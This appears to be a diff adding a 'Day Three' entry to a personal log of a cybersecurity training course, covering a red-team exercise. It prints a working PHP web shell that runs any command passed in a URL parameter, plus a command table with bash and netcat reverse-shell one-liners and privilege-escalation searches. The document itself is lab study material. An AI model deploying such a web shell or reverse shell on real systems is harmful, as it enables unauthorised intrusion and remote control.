@@ -48,6 +48,40 @@ The activity itself had us 'login' to a SIEM \(Security Information and Event Ma
 
 ### DAY THREE ###
 
+Third day started with a small recap of blue teaming and then we got to red teaming too. So that was more hands on and it gave me quite some fun! I poked and prodded around and now I know even more than bafore and getting the right idea is over half of the battle. Basically we had to figure out how the 'attacker' got the shell inside and do the same, using the code below to cat one file. Also I kinda feel like the question about IP is mislabeled as RED TEAM when info from that is only available in logs. And RED TEAMERS should know their IPs already...
+
+Reverse shell.php:
+>```<html>
+><body>
+><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+><input type="text" name="command" autofocus id="command" size="50">
+><input type="submit" value="Execute">
+></form>
+><pre>
+><?php
+>    if(isset($_GET['command'])) 
+>    {
+>        system($_GET['command'] . ' 2>&1'); 
+>    }
+>?>
+></pre>
+></body>
+></html>
+Useful commands:
+>| Command |	Use |
+>| --- | --- |
+>| `ls` | 	Will give you an idea of what files/directories surround you |
+>| `pwd` | 	Will give you an idea of where in the system you are |
+>| `whoami` | 	Will let you know who you are in the system |
+>| `hostname` | 	The system name and potentially its role in the network |
+>| `uname -a` | 	Will give you some system information like the OS, kernel version, and more |
+>| `id` | 	If the current user is assigned to any groups |
+>| `ifconfig` | 	Allows you to understand the system's network setup |
+>| `bash -i >& /dev/tcp/<your-ip>/<port> 0>&1` | 	A command used to begin a reverse shell via bash |
+>| `nc -e /bin/sh <your-ip> <port>` | 	A command used to begin a reverse shell via Netcat |
+>| `find / -perm -4000 -type f 2>/dev/null` | 	Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root) |
+>| `find / -writable -type  f 2>/dev/null \| grep -v "/proc/"` | 	Also helpful in privilege escalation attempts used to find files with writable permissions |
+
 ### DAY FOUR ###
 
 ### DAY FIVE ###
